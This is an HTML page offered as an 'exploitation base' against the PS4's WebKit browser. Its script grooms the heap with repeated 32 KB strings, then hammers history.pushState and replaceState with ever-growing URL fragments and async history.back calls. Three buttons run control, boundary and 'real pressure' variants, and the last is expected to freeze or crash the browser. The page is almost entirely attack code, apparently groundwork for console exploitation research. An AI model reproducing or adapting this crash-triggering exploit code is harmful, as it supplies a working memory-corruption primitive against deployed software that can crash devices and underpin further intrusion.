<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – History Exploitation Base</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; padding:10px; margin:5px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>

<body>
<h2>PS4 WebKit – History.pushState Exploitation Base</h2>

<button onclick="runOptionA()">OPTION A – Control (no crash)</button>
<button onclick="runOptionB()">OPTION B – Boundary (49 + partial)</button>
<button onclick="runOptionC()">OPTION C – REAL PRESSURE (expected crash)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const ITERS = 50;

// Grooming persistente (CRÍTICO)
let heap = [];

// Estado reaproveitado
let sharedState = { i: 0, p: "" };

// -------------------------------------------------
// CORE HISTORY SEQUENCE
// -------------------------------------------------
async function historySequence(iterations, mode){
    let size = BASE;

    for(let i=0;i<iterations;i++){
        sharedState.i = i;
        sharedState.p = "A".repeat(size);

        // Grooming cumulativo real
        heap.push("G".repeat(32768)); // 32 KB por iteração

        log(`[ITER ${i}] size=${size}`);

        if(mode !== "C"){
            history.pushState({}, "", "#"+sharedState.p);
            history.replaceState({}, "", "#"+sharedState.p.slice(0, size >> 1));
        } else {
            // MODO REAL: mesmo objeto, mutação in-place
            history.pushState(sharedState, "", "#"+sharedState.p);
            history.replaceState(sharedState, "", "#"+sharedState.p);
        }

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log("  history.back (async)");
        }

        size += STEP;

        // Yield mínimo APENAS para log
        await sleep(3);
    }
}

// -------------------------------------------------
// OPTION A – Controle
// -------------------------------------------------
async function runOptionA(){
    logEl.textContent = "";
    log("=== OPTION A START ===");

    await historySequence(49, "A");

    log("[A] Sequence done, post-usage");
    let arr = [];
    for(let i=0;i<40;i++) arr.push("X".repeat(256));

    log("=== OPTION A END (expected no crash) ===");
}

// -------------------------------------------------
// OPTION B – Boundary
// -------------------------------------------------
async function runOptionB(){
    logEl.textContent = "";
    log("=== OPTION B START ===");

    await historySequence(49, "B");

    log("[B] Partial extra push");
    history.pushState({}, "", "#"+"B".repeat(BASE + STEP*49));

    log("=== OPTION B END ===");
}

// -------------------------------------------------
// OPTION C – REAL PRESSURE PATH
// -------------------------------------------------
async function runOptionC(){
    logEl.textContent = "";
    log("=== OPTION C START ===");
    log("Expected: freeze/crash around ITER 43–49");

    await historySequence(ITERS, "C");

    log("=== OPTION C END (if reached) ===");
}

log("Ready.");
</script>
</body>
</html>

